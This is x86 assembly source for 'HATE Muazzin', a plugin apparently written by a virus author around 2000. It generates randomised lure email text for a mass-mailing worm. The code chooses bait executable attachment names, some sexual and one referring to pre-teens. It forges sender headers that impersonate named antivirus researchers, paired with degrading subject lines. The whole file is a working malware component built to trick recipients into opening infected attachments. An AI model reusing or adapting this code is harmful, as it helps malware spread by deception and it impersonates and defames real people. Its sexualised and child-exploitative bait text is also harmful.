 comment * ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
                                _   _   _   _
                               / \ / \ / \ / \
                              ( H | A | T | E )
                               \_/ \_/ \_/ \_/

                        Human-Alike Text Engine v0.1á
                             (c) Mister Sandman, 2000


 HATE(en)
 ÄÄÄÄÄÄÄÄ
 ş Verb conjugation:
       ş Present simple tense (1/7).
       ş Past simple tense (3/7).
       ş Future tense (2/7+5/9).
       ş Conditional tense (1/7).
       ş 3rd person concordance (+s).
 ş Singular/plural concordance.
 ş Affirmative/negative (9/10, 1/10).
 ş Random header/footer.
 ş Noun/adjective repetitions avoided.
 ş Easily customizable sentence-patterns.
 X Easily updateable word lists and topics.
 ş Complete lists with:
       ş Substantives.
       ş Adjectives.
       ş Pronouns (subject/object).
       ş Demostratives (singular/plural).
       ş Adverbs.
       ş Articles (un/determined).
       ş Prepositions.
       ş Interrogative particles.
       ş Question/idiomatic tags.
       ş Happy/sad smileys.

 ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ *

                .386p
                .model  flat

                extrn   ExitProcess:NEAR

; ÍÍ¹ HATE Muazzin Entry Code ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

                .code
muazzin_entry:  mov     ebp,dword ptr [esp+4]
                mov     eax,dword ptr [ebp+m_why]
                test    eax,MT_QUERY
                jz      check_gentext

                mov     eax,MR_DONE
                mov     ebx,MZ_TYPE
                mov     ecx,MZ_VERSION
                mov     esi,MT_QUERY+MT_GENTEXT
                ret     4

check_gentext:  test    eax,MT_GENTEXT
                jz      exit_door

; ÄÄ´ HATE Initialization Routine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

                pushad
                call    push_kernel
                db      'KERNEL32.dll',0
push_kernel:    call    dword ptr [ebp+GMH]
                call    push_gettick
                db      'GetTickCount',0
push_gettick:   push    eax
                call    dword ptr [ebp+GPA]

                call    eax
                mov     edi,dword ptr [ebp+m_buffer]

                call    delta_offset
delta_offset:   pop     ebp
                sub     ebp,offset delta_offset

                push    edi
                mov     dword ptr [ebp+buffer_address],edi
                mov     dword ptr [ebp+random_seed],eax
                mov     eax,((offset @fname_end-offset @fname_start)/4)-1
                lea     esi,dword ptr [ebp+@fname_start]
                add     edi,mtext_exename
                call    get_rnd_range
                call    copy_string

                mov     edi,dword ptr [esp]
                mov     eax,((offset @sender_end-offset @sender_start)/4)-1
                lea     esi,dword ptr [ebp+@sender_start]
                add     edi,mtext_headers
                call    get_rnd_range
                call    copy_string

; ÄÄ´ E-mail Text Generation ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

                dec     edi
                mov     dword ptr [edi],0
                pop     edi
                mov     eax,((offset @line_end-offset @line_start)/4)-1
                lea     esi,dword ptr [ebp+@line_start]
                call    get_rnd_range
                call    copy_string

                dec     edi
                mov     al,'>'
                stosb

                mov     eax,((offset @pattern_end-offset @pattern_start)/4)-1
                lea     esi,dword ptr [ebp+@pattern_start]
                call    get_rnd_range

                mov     ecx,4
                mul     ecx
                add     esi,eax
                mov     esi,dword ptr [esi]
                add     esi,ebp

use_pattern:    lodsd
                or      eax,eax
                je      pattern_done

                xchg    edx,eax
                lodsd
                push    esi
                xchg    esi,edx
                sub     eax,esi
                mov     ecx,4
                cdq
                div     ecx
                dec     eax
                add     esi,ebp
                call    get_rnd_range
                call    copy_string

                pop     esi
                jmp     use_pattern

pattern_done:   mov     al,'.'
                dec     edi
                stosb

                mov     eax,0a0d0a0dh
                stosd

                popad
exit_door:      mov     dword ptr [ebp+m_result],MR_OK
                ret     4

; ÍÍ¹ HATE Muazzin Internal Routines ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

; ÄÄ´ String-copying Routine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

copy_string:    mov     dword ptr [ebp+word_type],0
                mov     ecx,4
                mul     ecx
                add     esi,eax

                lea     eax,dword ptr [ebp+@subj_05]
                cmp     esi,eax
                jb      not_third_sg

                lea     eax,dword ptr [ebp+@subj_end]
                cmp     esi,eax
                jb      set_plus_s

not_third_sg:   lea     eax,dword ptr [ebp+@dems_03]
                cmp     esi,eax
                jb      not_plural

                lea     eax,dword ptr [ebp+@dems_end]
                cmp     esi,eax
                jb      set_plus_s

not_plural:     lea     eax,dword ptr [ebp+@noun_end-4]
                cmp     esi,eax
                ja      check_adjt

                lea     eax,dword ptr [ebp+@noun_start]
                cmp     esi,eax
                jb      tabooless

                mov     dword ptr [ebp+word_type],'noun'
                jmp     look_4_word

check_adjt:     lea     eax,dword ptr [ebp+@adjt_end-4]
                cmp     esi,eax
                ja      check_verb

                lea     eax,dword ptr [ebp+@adjt_start]
                cmp     esi,eax
                jb      tabooless

                mov     dword ptr [ebp+word_type],'adjt'
                jmp     look_4_word

check_verb:     lea     eax,dword ptr [ebp+@verb_end-4]
                cmp     esi,eax
                ja      tabooless

                lea     eax,dword ptr [ebp+@verb_start]
                cmp     esi,eax
                jb      tabooless

choose_tense:   mov     eax,6
                mov     ebx,eax
                call    get_rnd_range

                dec     ebx
                cmp     eax,ebx
                je      present

                dec     ebx
                cmp     eax,ebx
                je      past

                dec     ebx
                cmp     eax,ebx
                je      past

                dec     ebx
                cmp     eax,ebx
                je      past

                or      eax,eax
                je      conditional

                mov     eax,9
                call    get_rnd_range
                cmp     eax,5
                jb      choose_tense

                lea     edx,dword ptr [ebp+tnse_01]
future:         mov     byte ptr [ebp+plus_s],0
                push    esi
                mov     esi,edx

set_future:     lodsb
                or      al,al
                jz      future_done

                stosb
                jmp     set_future

future_done:    mov     al,20h
                stosb

                mov     eax,9
                call    get_rnd_range
                or      eax,eax
                jnz     affirm_future

                lea     esi,dword ptr [ebp+negt_01]
negtv_future:   lodsb
                or      al,al
                jz      @prev2future

                stosb
                jmp     negtv_future

@prev2future:   mov     al,20h
                stosb

affirm_future:  pop     esi
                jmp     tabooless

conditional:    lea     edx,dword ptr [ebp+tnse_02]
                jmp     future

past:           mov     byte ptr [ebp+plus_s],0
                mov     eax,9
                call    get_rnd_range
                or      eax,eax
                jnz     affirm_past

                push    esi
                lea     esi,dword ptr [ebp+negt_03]
negtv_past:     lodsb
                or      al,al
                jz      @prev2past

                stosb
                jmp     negtv_past

@prev2past:     mov     al,20h
                stosb
                pop     esi
                mov     esi,dword ptr [esi]
                add     esi,ebp
                jmp     @@loop_it

affirm_past:    mov     esi,dword ptr [esi]
                add     esi,ebp
get_2_past:     lodsb
                or      al,al
                jne     get_2_past
                jmp     @@loop_it

present:        mov     eax,9
                call    get_rnd_range
                or      eax,eax
                jz      set_pres_neg

                cmp     byte ptr [ebp+plus_s],0
                je      tabooless

                mov     byte ptr [ebp+plus_s],0
                mov     esi,dword ptr [esi]
                add     esi,ebp
set_third:      lodsb
                or      al,al
                jz      skip_past

                stosb
                jmp     set_third

skip_past:      lodsb
                or      al,al
                jnz     skip_past

attach_the_s:   lodsb
                or      al,al
                jz      jump_back

                stosb
                jmp     attach_the_s
jump_back:      jmp     @@stuff_done

set_pres_neg:   push    esi
                cmp     byte ptr [ebp+plus_s],0
                jne     third_negtv

                lea     esi,dword ptr [ebp+negt_02]
                jmp     negtv_present

third_negtv:    mov     byte ptr [ebp+plus_s],0
                lea     esi,dword ptr [ebp+negt_04]

negtv_present:  lodsb
                or      al,al
                jz      @prev2present

                stosb
                jmp     negtv_present

@prev2present:  mov     al,20h
                stosb
                pop     esi
                jmp     tabooless

set_plus_s:     inc     byte ptr [ebp+plus_s]
                jmp     tabooless

look_4_word:    push    edi eax
                mov     edx,esi
                lea     esi,dword ptr [ebp+taboo_list]

check_noun:     lodsd
                or      eax,eax
                je      not_taboo

                cmp     eax,edx
                jne     check_noun

                pop     esi edi
                cmp     dword ptr [ebp+word_type],'noun'
                jne     set_adjt

                mov     eax,((offset @noun_end-offset @noun_start)/4)-1
                jmp     get_another

set_adjt:       mov     eax,((offset @adjt_end-offset @adjt_start)/4)-1
get_another:    call    get_rnd_range
                jmp     copy_string

not_taboo:      mov     eax,edx
                mov     edi,esi
                sub     edi,4
                stosd

                pop     eax edi
                mov     esi,edx
tabooless:      mov     esi,dword ptr [esi]
                add     esi,ebp
@@loop_it:      lodsb
                or      al,al
                jz      check_plural

                stosb
                jmp     @@loop_it

check_plural:   cmp     dword ptr [ebp+word_type],'noun'
                jne     @@stuff_done

                cmp     byte ptr [ebp+plus_s],0
                je      @@stuff_done

                mov     al,'s'
                mov     byte ptr [ebp+plus_s],0
                stosb

@@stuff_done:   mov     al,20h
                stosb
                ret

; ÄÄ´ Random Value Generating Routines ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

get_random:     push    ecx edx
                mov     eax,dword ptr [ebp+random_seed]
                mov     ecx,41c64e6dh
                mul     ecx
                add     eax,3039h
                and     eax,7fffffffh
                mov     dword ptr [ebp+random_seed],eax
                pop     edx ecx
                ret

get_rnd_range:  push    ecx edx
                mov     ecx,eax
                call    get_random
                xor     edx,edx
                div     ecx
                mov     eax,edx
                pop     edx ecx
                ret

; ÍÍ¹ Muazzin Data Section ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

@subj_start     label   byte
                dd      offset subj_01
                dd      offset subj_02
                dd      offset subj_03
                dd      offset subj_04
@subj_05        dd      offset subj_05
                dd      offset subj_06
                dd      offset subj_07
                dd      offset subj_08
                dd      offset subj_09
@subj_end       label   byte

@noun_start     label   byte
                dd      offset noun_01
                dd      offset noun_02
                dd      offset noun_03
                dd      offset noun_04
                dd      offset noun_05
                dd      offset noun_06
@noun_end       label   byte

@adjt_start     label   byte
                dd      offset adjt_01
                dd      offset adjt_02
                dd      offset adjt_03
                dd      offset adjt_04
                dd      offset adjt_05
                dd      offset adjt_06
@adjt_end       label   byte

@poss_start     label   byte
                dd      offset poss_01
                dd      offset poss_02
                dd      offset poss_03
                dd      offset poss_04
                dd      offset poss_05
                dd      offset poss_06
                dd      offset poss_07
@poss_end       label   byte

@dems_start     label   byte
                dd      offset dems_01
                dd      offset dems_02
@dems_03        dd      offset dems_03
                dd      offset dems_04
@dems_end       label   byte

@prep_start     label   byte
                dd      offset prep_01
                dd      offset prep_02
                dd      offset prep_03
                dd      offset prep_04
                dd      offset prep_05
                dd      offset prep_06
                dd      offset prep_10
                dd      offset prep_14
@prep_end       label   byte

@prns_start     label   byte
                dd      offset prns_01
                dd      offset prns_02
                dd      offset prns_03
                dd      offset prns_04
                dd      offset prns_05
                dd      offset prns_06
                dd      offset prns_07
@prns_end       label   byte

@advb_start     label   byte
                dd      offset advb_01
                dd      offset advb_02
                dd      offset advb_03
                dd      offset advb_04
                dd      offset advb_05
                dd      offset advb_06
@advb_end       label   byte

@artc_start     label   byte
                dd      offset artc_01
                dd      offset artc_02
@artc_end       label   byte

@tags_start     label   byte
                dd      offset tags_01
                dd      offset tags_02
                dd      offset tags_03
                dd      offset tags_04
                dd      offset tags_05
@tags_end       label   byte

@hsmi_start     label   byte
                dd      offset hsmi_01
                dd      offset hsmi_02
                dd      offset hsmi_03
                dd      offset hsmi_04
                dd      offset hsmi_05
                dd      offset hsmi_06
                dd      offset hsmi_07
@hsmi_end       label   byte

@ssmi_start     label   byte
                dd      offset ssmi_01
                dd      offset ssmi_02
                dd      offset ssmi_03
@ssmi_end       label   byte

@intr_start     label   byte
                dd      offset intr_01
                dd      offset intr_02
                dd      offset intr_03
                dd      offset intr_04
                dd      offset intr_05
                dd      offset intr_06
@intr_end       label   byte

@verb_start     label   byte
                dd      offset verb_01
                dd      offset verb_02
                dd      offset verb_03
                dd      offset verb_04
                dd      offset verb_05
                dd      offset verb_06
                dd      offset verb_07
                dd      offset verb_08
                dd      offset verb_09
@verb_end       label   byte

@have_start     label   byte
                dd      offset have_01
@have_end       label   byte

@line_start     label   byte
                dd      offset line_01
                dd      offset line_02
                dd      offset line_03
                dd      offset line_04
                dd      offset line_05
                dd      offset line_06
@line_end       label   byte

@fname_start    label   byte
                dd      offset fname_01
                dd      offset fname_02
                dd      offset fname_03
                dd      offset fname_04
                dd      offset fname_05
                dd      offset fname_06
@fname_end      label   byte

@sender_start   label   byte
                dd      offset sender_01
                dd      offset sender_02
                dd      offset sender_03
                dd      offset sender_04
                dd      offset sender_05
                dd      offset sender_06
@sender_end     label   byte

@pattern_start  label   byte
                dd      offset pattern_01
                dd      offset pattern_02
@pattern_end    label   byte

pattern_01      dd      offset @subj_start,offset @subj_end
                dd      offset @verb_start,offset @verb_end
                dd      offset @artc_start,offset @artc_end
                dd      offset @noun_start,offset @noun_end
                dd      offset @prep_start,offset @prep_end
                dd      offset @dems_start,offset @dems_end
                dd      offset @adjt_start,offset @adjt_end
                dd      offset @noun_start,offset @noun_end
                dd      offset @prep_start,offset @prep_end
                dd      offset @artc_start,offset @artc_end
                dd      offset @adjt_start,offset @adjt_end
                dd      offset @noun_start,offset @noun_end
                dd      offset @tags_start,offset @tags_end
                dd      offset @hsmi_start,offset @hsmi_end,0

pattern_02      dd      offset @subj_start,offset @subj_end
                dd      offset @verb_start,offset @verb_end
                dd      offset @prep_start,offset @prep_end
                dd      offset @artc_start,offset @artc_end
                dd      offset @noun_start,offset @noun_end
                dd      offset @prep_start,offset @prep_end
                dd      offset @adjt_start,offset @adjt_end
                dd      offset @noun_start,offset @noun_end
                dd      offset @subj_start,offset @subj_end
                dd      offset @verb_start,offset @verb_end
                dd      offset @prep_start,offset @prep_end
                dd      offset @prns_start,offset @prns_end
                dd      offset @advb_start,offset @advb_end
                dd      offset @hsmi_start,offset @hsmi_end,0

@@subj_start    label   byte
subj_01         db      'I',0
subj_02         db      'you',0
subj_03         db      'we',0
subj_04         db      'they',0
subj_05         db      'he',0
subj_06         db      'she',0
subj_07         db      'Muhammad',0
subj_08         db      'Michael',0
subj_09         db      'Gianni',0
@@subj_end      label   byte

@@noun_start    label   byte
noun_01         db      'list',0
noun_02         db      'password',0
noun_03         db      'picture',0
noun_04         db      'site',0
noun_05         db      'server',0
noun_06         db      'message',0
@@noun_end      label   byte

@@adjt_start    label   byte
adjt_01         db      'pr0n',0
adjt_02         db      'stolen',0
adjt_03         db      'cool',0
adjt_04         db      'hot',0
adjt_05         db      'XXX',0
adjt_06         db      'amazing',0
@@adjt_end      label   byte

@@poss_start    label   byte
poss_01         db      'my',0
poss_02         db      'your',0
poss_03         db      'his',0
poss_04         db      'her',0
poss_05         db      'its',0
poss_06         db      'our',0
poss_07         db      'their',0
@@poss_end      label   byte

@@dems_start    label   byte
dems_01         db      'this',0
dems_02         db      'that',0
dems_03         db      'these',0
dems_04         db      'those',0
@@dems_end      label   byte

@@prep_start    label   byte
prep_01         db      'of',0
prep_02         db      'to',0
prep_03         db      'about',0
prep_04         db      'with',0
prep_05         db      'from',0
prep_06         db      'in',0
prep_10         db      'for',0
prep_14         db      'on',0
@@prep_end      label   byte

@@prns_start    label   byte
prns_01         db      'me',0
prns_02         db      'you',0
prns_03         db      'him',0
prns_04         db      'her',0
prns_05         db      'it',0
prns_06         db      'us',0
prns_07         db      'them',0
@@prns_end      label   byte

@@advb_start    label   byte
advb_01         db      'once',0
advb_02         db      'soon',0
advb_03         db      'later',0
advb_04         db      'before',0
advb_05         db      'after',0
advb_06         db      'by means of',0
@@advb_end      label   byte

@@artc_start    label   byte
artc_01         db      'the',0
artc_02         db      'a',0
@@artc_end      label   byte

@@tags_start    label   byte
tags_01         db      ', right?',0
tags_02         db      ', no?',0
tags_03         db      '...',0
tags_04         db      ', hehehe...',0
tags_05         db      '... erhmmm...',0
@@tags_end      label   byte

@@hsmi_start    label   byte
hsmi_01         db      ':)',0
hsmi_02         db      ';)',0
hsmi_03         db      '8)',0
hsmi_04         db      ':D',0
hsmi_05         db      ';D',0
hsmi_06         db      ':))',0
hsmi_07         db      ';))',0
@@hsmi_end      label   byte

@@ssmi_start    label   byte
ssmi_01         db      ':(',0
ssmi_02         db      ';(',0
ssmi_03         db      ':/',0
@@ssmi_end      label   byte

@@intr_start    label   byte
intr_01         db      'what',0
intr_02         db      'who',0
intr_03         db      'where',0
intr_04         db      'which',0
intr_05         db      'how',0
intr_06         db      'when',0
@@intr_end      label   byte

@@negt_start    label   byte
negt_01         db      'not',0
negt_02         db      'don''t',0
negt_03         db      'didn''t',0
negt_04         db      'doesn''t',0
@@negt_end      label   byte

@@verb_start    label   byte
verb_01         db      'access',0,'accessed',0,'es',0
verb_02         db      'send',0,'sent',0,'s',0
verb_03         db      'attach',0,'attached',0,'es',0
verb_04         db      'receive',0,'received',0,'s',0
verb_05         db      'find',0,'found',0,'s',0
verb_06         db      'give',0,'gave',0,'s',0
verb_07         db      'remember',0,'remembered',0,'s',0
verb_08         db      'promise',0,'promised',0,'s',0
verb_09         db      'ask',0,'asked',0,'s',0
@@verb_end      label   byte

@@have_start    label   byte
have_01         db      'have to',0,'had to',0
@@have_end      label   byte

@@tnse_start    label   byte
tnse_01         db      'will',0
tnse_02         db      'would',0
@@tnse_end      label   byte

@@line_start    label   byte
line_01         db      'At 19:57 18/12/00 -0800, you wrote:',0dh,0ah,0dh,0ah,0
line_02         db      'Hi,',0dh,0ah,0dh,0ah,0
line_03         db      'Hello :)',0dh,0ah,0dh,0ah,0
line_04         db      'Hey!',0dh,0ah,0dh,0ah,0
line_05         db      'Hello,',0dh,0ah,0dh,0ah,0
line_06         db      'Buddy!',0dh,0ah,0dh,0ah,0
@@line_end      label   byte

@@fname_start   label   byte
fname_01        db      'Russian Drunkard.scr',0
fname_02        db      'The Hungarian Freak!.exe',0
fname_03        db      'Scandinavian Sissy.exe',0
fname_04        db      'Bulgarian Dildo.scr',0
fname_05        db      'Pre-teen Bondage.scr',0
fname_06        db      'Hot Cheerleaders.exe',0
@@fname_end     label   byte

@@sender_start  label   byte
sender_01       db      'From: Eugene Kaspersky <eugene@avp.ru>',0dh,0ah
                db      'Subject: Russian bear != Russian beer',0dh,0ah,0
sender_02       db      'From: P‚ter Sz”r <peterszor@mail.com>',0dh,0ah
                db      'Subject: Uglier than Hermann Monster!',0dh,0ah,0
sender_03       db      'From: Mikko Hypp”nen <Mikko.Hypponen@DataFellows.com>',0dh,0ah
                db      'Subject: Finnish sissies can score too ;)',0dh,0ah,0
sender_04       db      'From: Vesselin Bontchev <bontchev@complex.is>',0dh,0ah
                db      'Subject: Chusky and Liubenitza give me stiffy!',0dh,0ah,0
sender_05       db      'From: Sami Rautiainen <Sami.Rautiainen@DataFellows.com>',0dh,0ah
                db      'Subject: My young ass is wishing to learn :)',0dh,0ah,0
sender_06       db      'From: Nick Fitzgerald <nick@virus-l.demon.co.uk>',0dh,0ah
                db      'Subject: Cheerleaders! Gimme an "A"! Gimme a "C"! Gimme a "V"!',0dh,0ah,0
@@sender_end    label   byte

include         \muazzin\muazzin.asi

MZ_VERSION      equ     0105h
MZ_TYPE         equ     'txet'

greetings       db      0dh,0ah,0dh,0ah
                db      '[HATE Muazzin v0.01, by Mister Sandman]',0dh,0ah
                db      'Greetings to my best friends:',0dh,0ah
                db      'Vecna, Spanska, Z0MBiE, Lord Julus, Jacky Qwerty',0dh,0ah
                db      'E abra‡os para os da galera brazuca! ;)',0dh,0ah
                db      'Ox¡moron: la vieja escuela pega de nuevo',0dh,0ah
                db      'Narakom f''Malta bil-virus il-gdid tieghi!',0dh,0ah,0dh,0ah

taboo_list      label   byte
                dd      ?
                dd      ?
                dd      ?
                dd      ?
                dd      ?
                dd      ?
                dd      ?
                dd      ?
                dd      ?
                dd      ?,0

buffer_address  dd      ?
random_seed     dd      ?
word_type       dd      0
plus_s          db      0
                end     muazzin_entry
